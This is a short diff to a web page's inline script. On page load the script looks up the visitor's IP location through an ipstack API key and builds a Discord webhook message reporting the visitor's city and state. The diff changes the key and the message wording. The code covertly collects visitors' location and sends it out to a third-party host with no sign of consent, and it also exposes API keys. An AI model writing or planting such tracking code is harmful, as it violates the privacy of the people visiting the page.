@@ -8,7 +8,7 @@
 <body>
 
 <script>
-  fetch('https://api.ipstack.com/90a400341478c3fbcd6fb2197aec2bc9?format=json')
+  fetch('https://api.ipstack.com/bfe9f61029622f0926af1e770b11d503?format=json')
     .then(response => response.json())
     .then(data => {
         const city = data.city;
@@ -17,7 +17,7 @@
 
         // Create payload for Discord webhook
         const payload = {
-            content: `city : ${city}, state : ${state}`,
+            content: `User's Location: ${city}, ${state}`,
         };
 
         // Send data to Discord webhook
